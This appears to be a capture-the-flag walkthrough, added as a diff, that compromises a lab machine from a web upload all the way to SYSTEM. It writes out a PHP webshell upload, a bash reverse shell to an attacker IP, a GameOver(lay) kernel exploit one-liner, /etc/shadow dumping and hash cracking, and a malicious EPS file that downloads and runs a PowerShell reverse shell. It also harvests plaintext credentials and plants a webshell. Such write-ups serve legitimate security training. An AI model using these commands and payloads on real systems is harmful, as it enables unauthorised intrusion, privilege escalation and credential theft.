@@ -1,0 +1,248 @@
+
+
+
+
+port 443 gives us a login page
+port 8080 allows us to register an account
+
+we login and see upload functionality.
+
+http://10.10.11.241:8080/index.php
+
+seeing that the web technology is php, we try for a php webshell or similar but are denied.
+
+We use burp to fuzz the file extension parameters and find .phar is permitted.
+
+Most functions are disabled. But not popen.
+p0wny-shell.phar works.
+
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -u http://10.10.11.241:8080/FUZZ/ --hc 404
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.11.241:8080/FUZZ/
+Total requests: 62281
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                             
+=====================================================================
+
+000000015:   403        9 L      28 W       279 Ch      "css"                                               
+000000009:   403        9 L      28 W       279 Ch      "js"                                                
+000000002:   403        9 L      28 W       279 Ch      "images"                                            
+000000070:   403        9 L      28 W       279 Ch      "uploads"                                           
+000000276:   403        9 L      28 W       279 Ch      "fonts"                                             
+000000386:   403        9 L      28 W       279 Ch      "icons"                                             
+000001518:   403        9 L      28 W       279 Ch      "vendor"                                            
+000004227:   403        9 L      28 W       279 Ch      "server-status"    
+
+
+
+http://10.10.11.241:8080/uploads/p0wny-shell.phar
+
+www-data@webserver:…/html/uploads# bash -c 'bash -i >& /dev/tcp/10.10.14.38/53 0>&1'
+
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lvnp 53                         
+listening on [any] 53 ...
+connect to [10.10.14.38] from (UNKNOWN) [10.10.11.241] 6514
+bash: cannot set terminal process group (974): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@webserver:/var/www/html/uploads$ 
+
+
+
+
+www-data@webserver:/var/www/html/uploads$ uname -a
+Linux webserver 5.19.0-35-generic #36-Ubuntu SMP PREEMPT_DYNAMIC Fri Feb 3 18:36:56 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
+
+
+for this version we can use CVE-2023-35001 or Game Over(lay)
+familiar with Game Over(lay) from the Analytics box.
+
+
+www-data@webserver:/var/www/html/uploads$ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+root@webserver:/var/www/html/uploads# id
+uid=0(root) gid=33(www-data) groups=33(www-data)
+root@webserver:/var/www/html/uploads# 
+
+
+
+root@webserver:/var/www/html/uploads# cat /etc/shadow
+root:$y$j9T$s/Aqv48x449udndpLC6eC.$WUkrXgkW46N4xdpnhMoax7US.JgyJSeobZ1dzDs..dD:19612:0:99999:7:::
+...
+drwilliams:$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:19612:0:99999:7:::
+lxd:!:19612::::::
+mysql:!:19620::::::
+root@webserver:/var/www/html/uploads# 
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# echo '$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/' >hash
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+qwe123!@#        (?)     
+1g 0:00:00:26 DONE (2025-12-19 09:51) 0.03725g/s 7992p/s 7992c/s 7992C/s raycharles..pl@yboy
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+
+
+back on port 443 we able to login, its a Roundcube instance
+
+"I wanted to remind you that the project for lighter, cheaper and
+environmentally friendly needles is still ongoing 💉. You are the one in
+charge of providing me with the designs for these so that I can take
+them to the 3D printing department and start producing them right away.
+Please make the design in an ".eps" file format so that it can be well
+visualized with GhostScript."
+
+
+
+
+I add Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.38 -Port 443 to the bottom of Invoke-PowershellTcp.ps1
+
+┌──(root㉿kali)-[/home/kali]
+└─# cat evil.eps                
+%!PS
+(%pipe%powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.38/Invoke-PowerShellTcp.ps1')") (w) file
+                                 
+
+email this to the doctor
+
+┌──(root㉿kali)-[/home/kali]
+└─# python3 -m http.server 80                                                      
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.11.241 - - [19/Dec/2025 10:00:57] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lvnp 443
+listening on [any] 443 ...
+connect to [10.10.14.38] from (UNKNOWN) [10.10.11.241] 6312
+Windows PowerShell running as user drbrown on DC
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+
+PS C:\Users\drbrown.HOSPITAL\Documents>
+
+
+there are a couple ways to privesc
+
+
+PS C:\Users\drbrown.HOSPITAL\Documents> dir
+
+
+    Directory: C:\Users\drbrown.HOSPITAL\Documents
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+-a----       10/23/2023   3:33 PM            373 ghostscript.bat                                                       
+-a----       12/19/2025   2:08 PM          21892 peas.txt                                                              
+-a----       12/19/2025   2:05 PM          36950 winPEAS.bat                                                           
+
+
+PS C:\Users\drbrown.HOSPITAL\Documents> type ghostscript.bat
+@echo off
+set filename=%~1
+powershell -command "$p = convertto-securestring 'chr!$br0wn' -asplain -force;$c = new-object system.management.automation.pscredential('hospital\drbrown', $p);Invoke-Command -ComputerName dc -Credential $c -ScriptBlock { cmd.exe /c "C:\Program` Files\gs\gs10.01.1\bin\gswin64c.exe" -dNOSAFER "C:\Users\drbrown.HOSPITAL\Downloads\%filename%" }"
+PS C:\Users\drbrown.HOSPITAL\Documents> 
+
+
+
+using these creds, we can RDP in, and see that the webmail is open, and is being typed in by the administrator
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# xfreerdp3 /v:10.10.11.241 /u:drbrown /p:'chr!$br0wn' +clipboard /dynamic-resolution
+
+
+we can use identify the password box and use the console to obtain the hidden value
+document.getElementById('rcmloginpwd').value
+
+or , while entering into the console, the bot will start typing in for us
+
+Th3B3stH0sp1t4l9786!
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# evil-winrm -i 10.10.11.241 -u Administrator -p 'Th3B3stH0sp1t4l9786!'
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> 
+
+because of this, we may also use the metasploit keylogger
+
+
+additionally, we can see that xampp is in the C drive
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# evil-winrm -i 10.10.11.241 -u drbrown -p 'chr!$br0wn'                
+...
+*Evil-WinRM* PS C:\Users\drbrown.HOSPITAL\Documents> 
+
+
+*Evil-WinRM* PS C:\xampp> icacls htdocs
+htdocs NT AUTHORITY\LOCAL SERVICE:(OI)(CI)(F)
+       NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
+       BUILTIN\Administrators:(I)(OI)(CI)(F)
+       BUILTIN\Users:(I)(OI)(CI)(RX)
+       BUILTIN\Users:(I)(CI)(AD)
+       BUILTIN\Users:(I)(CI)(WD)
+       CREATOR OWNER:(I)(OI)(CI)(IO)(F)
+
+Successfully processed 1 files; Failed processing 0 files
+*Evil-WinRM* PS C:\xampp> 
+
+"Local Service and System have Full Control (F) as expected. 
+It is not expected that all users have RX (read and execute), 
+as well as AD (Append data/add subdirectory) and WD (Write data/add subdirectory). 
+This means all users can write here."
+
+
+*Evil-WinRM* PS C:\xampp\htdocs> upload p0wny-shell.php
+                                        
+Info: Uploading /home/kali/p0wny-shell.php to C:\xampp\htdocs\p0wny-shell.php
+                                        
+Data: 27092 bytes of 27092 bytes copied
+                                        
+Info: Upload successful!
+*Evil-WinRM* PS C:\xampp\htdocs> 
+
+
+then navigating to
+https://10.10.11.241/p0wny-shell.php
+
+DC$@DC:C:\xampp\htdocs# whoami
+nt authority\system
+
+
+
+
+
